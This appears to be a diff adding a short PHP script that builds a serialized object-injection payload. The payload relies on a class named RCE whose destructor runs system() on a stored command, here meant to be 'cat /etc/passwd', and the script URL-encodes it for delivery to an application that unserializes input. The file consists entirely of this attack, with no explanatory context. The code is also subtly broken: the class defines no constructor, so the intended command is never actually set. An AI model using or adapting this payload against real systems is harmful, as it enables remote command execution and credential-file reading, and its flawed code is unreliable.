@@ -1,0 +1,9 @@
+<?php
+class RCE {
+    public $cmd;
+    function __destruct() {
+        system($this->cmd);
+    }
+}
+echo urlencode(serialize(new RCE(['cmd' => 'cat /etc/passwd'])));
+?>
